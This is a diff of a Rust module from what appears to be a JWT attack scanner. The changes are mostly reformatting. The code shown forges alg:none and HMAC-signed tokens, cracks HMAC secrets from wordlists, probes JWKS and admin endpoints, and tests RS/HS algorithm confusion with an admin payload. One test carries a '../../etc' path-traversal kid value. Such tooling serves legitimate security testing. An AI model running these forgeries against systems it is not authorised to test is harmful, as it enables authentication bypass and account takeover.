@@ -21,11 +21,11 @@
 //! match is observed.
 
 use crate::arsenal_config::{finding_rich, ArsenalConfig, Evidence, Intensity};
+use crate::cloud_hunter::{GraphEdge, GraphNode};
 use crate::engine_dispatch::EngineRunContext;
 use crate::engine_probes::{
     empty_ok, extract_host, http_client, http_get, http_get_with_headers, normalize_url,
 };
-use crate::cloud_hunter::{GraphEdge, GraphNode};
 use crate::engine_result::{print_result, EngineResult};
 
 #[path = "jwt_attack_supreme.rs"]
@@ -292,7 +292,11 @@ fn parse_jwt(token: &str) -> Option<ParsedJwt> {
 /// Forge a token. `secret = None` → `alg:none` (empty signature). `Some(secret)` → HMAC-SHA256.
 fn forge_token(header: &Value, payload: &Value, secret: Option<&[u8]>) -> String {
     let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
-    let p = b64url_encode(serde_json::to_string(payload).unwrap_or_default().as_bytes());
+    let p = b64url_encode(
+        serde_json::to_string(payload)
+            .unwrap_or_default()
+            .as_bytes(),
+    );
     let signing_input = format!("{}.{}", h, p);
     match secret {
         None => format!("{}.", signing_input),
@@ -486,7 +490,18 @@ fn analyze_token(
         }
         let sensitive = cfg.string_list_or(
             "sensitive_claims",
-            &["role", "roles", "admin", "is_admin", "isAdmin", "scope", "scopes", "groups", "permissions", "authorities"],
+            &[
+                "role",
+                "roles",
+                "admin",
+                "is_admin",
+                "isAdmin",
+                "scope",
+                "scopes",
+                "groups",
+                "permissions",
+                "authorities",
+            ],
         );
         let present: Vec<String> = sensitive
             .iter()
@@ -555,9 +570,12 @@ async fn differential_accept(
     forged: &str,
 ) -> Option<(u16, u16, usize, usize)> {
     let baseline = http_get(client, url).await?;
-    let forged_resp =
-        http_get_with_headers(client, url, &[("Authorization", &format!("Bearer {}", forged))])
-            .await?;
+    let forged_resp = http_get_with_headers(
+        client,
+        url,
+        &[("Authorization", &format!("Bearer {}", forged))],
+    )
+    .await?;
     let baseline_protected = baseline.status == 401 || baseline.status == 403;
     let forged_ok = forged_resp.status >= 200 && forged_resp.status < 300;
     let bigger = forged_resp.body.len() > baseline.body.len().saturating_add(24);
@@ -597,15 +615,39 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
 
     let harvest_paths = cfg.string_list_or(
         "harvest_paths",
-        &["/", "/login", "/api/login", "/api/auth/login", "/auth", "/api/me", "/dashboard"],
+        &[
+            "/",
+            "/login",
+            "/api/login",
+            "/api/auth/login",
+            "/auth",
+            "/api/me",
+            "/dashboard",
+        ],
     );
     let auth_endpoints = cfg.string_list_or(
         "auth_endpoints",
-        &["/api/me", "/api/user", "/api/profile", "/profile", "/v1/me", "/api/v1/me", "/api/account", "/api/admin", "/admin"],
+        &[
+            "/api/me",
+            "/api/user",
+            "/api/profile",
+            "/profile",
+            "/v1/me",
+            "/api/v1/me",
+            "/api/account",
+            "/api/admin",
+            "/admin",
+        ],
     );
     let jwks_paths = cfg.string_list_or(
         "jwks_paths",
-        &["/.well-known/jwks.json", "/.well-known/openid-configuration", "/oauth/jwks", "/api/jwks", "/jwks.json"],
+        &[
+            "/.well-known/jwks.json",
+            "/.well-known/openid-configuration",
+            "/oauth/jwks",
+            "/api/jwks",
+            "/jwks.json",
+        ],
     );
     let min_rsa_bits = cfg.u64_or("min_rsa_bits", 2048) as u32;
 
@@ -634,7 +676,11 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
                 continue;
             }
             let probe = crate::ws_intelligence_bus::IntelArtifact {
-                kind: art.get("kind").and_then(|v| v.as_str()).unwrap_or("").to_string(),
+                kind: art
+                    .get("kind")
+                    .and_then(|v| v.as_str())
+                    .unwrap_or("")
+                    .to_string(),
                 value: value.to_string(),
                 source_url: String::new(),
                 source_engine: String::new(),
@@ -762,8 +808,7 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
     if check_jwks || test_confusion {
         let mut rsa_pems: Vec<(Vec<u8>, u32)> = Vec::new();
         let explicit = cfg.string("jwks_url");
-        let mut jwks_candidates: Vec<String> =
-            explicit.into_iter().collect::<Vec<_>>();
+        let mut jwks_candidates: Vec<String> = explicit.into_iter().collect::<Vec<_>>();
         jwks_candidates.extend(jwks_paths.iter().map(|p| join(&base, p)));
 
         for url in jwks_candidates.iter().take(8) {
@@ -788,7 +833,9 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
                     0.8,
                     Evidence::new().with("url", p.final_url.clone()).with("jwks_uri", jwks_uri.to_string()),
                 ));
-                http_get(&client, jwks_uri).await.and_then(|r| serde_json::from_str::<Value>(&r.body).ok())
+                http_get(&client, jwks_uri)
+                    .await
+                    .and_then(|r| serde_json::from_str::<Value>(&r.body).ok())
             } else {
                 Some(doc)
             };
@@ -857,7 +904,10 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
         if test_confusion && !rsa_pems.is_empty() {
             let base_payload = tokens
                 .iter()
-                .find(|(_, p)| p.alg.to_ascii_uppercase().starts_with("RS") || p.alg.to_ascii_uppercase().starts_with("ES"))
+                .find(|(_, p)| {
+                    p.alg.to_ascii_uppercase().starts_with("RS")
+                        || p.alg.to_ascii_uppercase().starts_with("ES")
+                })
                 .or_else(|| tokens.first())
                 .map(|(_, p)| p.payload.clone())
                 .unwrap_or_else(|| json!({ "sub": "admin", "user": "admin" }));
@@ -909,8 +959,14 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
     }
 
     // 6. Summary.
-    let crit = findings.iter().filter(|f| f.get("severity").and_then(Value::as_str) == Some("critical")).count();
-    let high = findings.iter().filter(|f| f.get("severity").and_then(Value::as_str) == Some("high")).count();
+    let crit = findings
+        .iter()
+        .filter(|f| f.get("severity").and_then(Value::as_str) == Some("critical"))
+        .count();
+    let high = findings
+        .iter()
+        .filter(|f| f.get("severity").and_then(Value::as_str) == Some("high"))
+        .count();
 
     let sig = supreme::collect_signals(&findings, tokens.len());
     if cfg.bool_or("attack_paths", true) {
@@ -959,10 +1015,27 @@ pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> 
     ));
 
     let n = findings.len();
-    let toxic = findings.iter().filter(|f| f.get("category").and_then(Value::as_str) == Some("toxic_combination")).count();
+    let toxic = findings
+        .iter()
+        .filter(|f| f.get("category").and_then(Value::as_str) == Some("toxic_combination"))
+        .count();
     EngineResult::ok_with_graph(
         findings,
-        format!("jwt_attack: {} finding(s) on {}{}{}", n, host, if toxic > 0 { format!(", {toxic} toxic combo(s)") } else { String::new() }, if crit > 0 { format!(", {crit} critical") } else { String::new() }),
+        format!(
+            "jwt_attack: {} finding(s) on {}{}{}",
+            n,
+            host,
+            if toxic > 0 {
+                format!(", {toxic} toxic combo(s)")
+            } else {
+                String::new()
+            },
+            if crit > 0 {
+                format!(", {crit} critical")
+            } else {
+                String::new()
+            }
+        ),
         graph_nodes,
         graph_edges,
     )
@@ -1016,8 +1089,14 @@ mod tests {
         let token = format!("{}.{}.{}", h, p, "sig");
         let parsed = parse_jwt(&token).expect("parse");
         assert_eq!(parsed.alg, "HS256");
-        assert_eq!(parsed.header.get("kid").and_then(|v| v.as_str()), Some("../../etc"));
-        assert_eq!(parsed.payload.get("role").and_then(|v| v.as_str()), Some("user"));
+        assert_eq!(
+            parsed.header.get("kid").and_then(|v| v.as_str()),
+            Some("../../etc")
+        );
+        assert_eq!(
+            parsed.payload.get("role").and_then(|v| v.as_str()),
+            Some("user")
+        );
         assert_eq!(parsed.signing_input, format!("{}.{}", h, p));
     }
 
@@ -1027,11 +1106,19 @@ mod tests {
         let h = b64url_encode(b"{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
         let p = b64url_encode(b"{\"sub\":\"admin\"}");
         let signing_input = format!("{}.{}", h, p);
-        let sig = hmac_sign(b"supersecret", signing_input.as_bytes(), MessageDigest::sha256()).unwrap();
+        let sig = hmac_sign(
+            b"supersecret",
+            signing_input.as_bytes(),
+            MessageDigest::sha256(),
+        )
+        .unwrap();
         let token = format!("{}.{}", signing_input, b64url_encode(&sig));
         let parsed = parse_jwt(&token).unwrap();
         let wordlist: Vec<String> = vec!["nope".into(), "supersecret".into(), "other".into()];
-        assert_eq!(crack_hmac_secret(&parsed, &wordlist).as_deref(), Some("supersecret"));
+        assert_eq!(
+            crack_hmac_secret(&parsed, &wordlist).as_deref(),
+            Some("supersecret")
+        );
         // Wrong-only wordlist must not yield a false positive.
         assert!(crack_hmac_secret(&parsed, &["wrong".to_string()]).is_none());
     }
